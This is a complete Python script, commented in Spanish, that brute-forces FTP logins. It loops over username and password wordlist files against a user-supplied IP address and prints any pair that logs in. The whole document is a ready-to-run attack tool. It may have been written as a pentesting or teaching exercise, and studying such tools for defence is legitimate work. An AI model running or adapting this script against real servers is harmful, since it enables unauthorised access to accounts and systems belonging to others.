#!/usr/bin/env python3

import ftplib  # Biblioteca para trabajar con servidores FTP
import sys  # Biblioteca para realizar operaciones del sistema, como finalizar el programa

def fuerza_bruta(direccion_ip, fichero_usuarios, fichero_passwords):
    """
    Realiza un ataque de fuerza bruta contra un servidor FTP utilizando listas de usuarios y contraseñas.

    Args:
        direccion_ip (str): Dirección IP del servidor FTP.
        fichero_usuarios (str): Ruta al archivo que contiene los nombres de usuario.
        fichero_passwords (str): Ruta al archivo que contiene las contraseñas.
    """
    try:
        # Abrir los archivos que contienen los nombres de usuario y contraseñas
        fichero_usuarios = open(fichero_usuarios, "r")
        fichero_passwords = open(fichero_passwords, "r")
        
        # Leer las líneas de los archivos (cada línea corresponde a un usuario o contraseña)
        usuarios = fichero_usuarios.readlines()
        passwords = fichero_passwords.readlines()

        # Iterar sobre todos los usuarios y contraseñas posibles
        for usuario in usuarios:
            for password in passwords:
                try:
                    print("[*] Intentando conectar con el servidor FTP")
                    
                    # Intentar conectarse al servidor FTP
                    connect = ftplib.FTP(direccion_ip)
                    
                    # Intentar iniciar sesión con las credenciales actuales
                    response = connect.login(usuario.strip(), password.strip())
                    print(response)  # Mostrar la respuesta del servidor
                    
                    # Si el inicio de sesión es exitoso
                    if "230" in response and "access granted" in response:
                        print("[*] ¡Ataque de fuerza bruta exitoso!")
                        print("Usuario: " + usuario.strip() + " | Contraseña: " + password.strip())
                        sys.exit()  # Salir del programa tras encontrar las credenciales correctas
                    else:
                        pass  # Si la respuesta no es positiva, continuar con el siguiente intento
                
                except ftplib.error_perm:
                    # Capturar error si las credenciales son incorrectas
                    print("Error: Fallo con usuario " + usuario.strip() + " y contraseña " + password.strip())
                    connect.close()  # Cerrar la conexión FTP
    except KeyboardInterrupt:
        # Manejar la interrupción manual del programa (Ctrl+C)
        print("Interrumpido por el usuario.")
        sys.exit()

# Pedir al usuario que introduzca la dirección IP del servidor FTP
direccion_ip = input("Introduce IP de un servidor FTP:")

# Archivos con usuarios y contraseñas
user_file = "usuarios.txt"  # Archivo que contiene los nombres de usuario
passwords_file = "passwords.txt"  # Archivo que contiene las contraseñas

# Llamar a la función de fuerza bruta con los parámetros
fuerza_bruta(direccion_ip, user_file, passwords_file)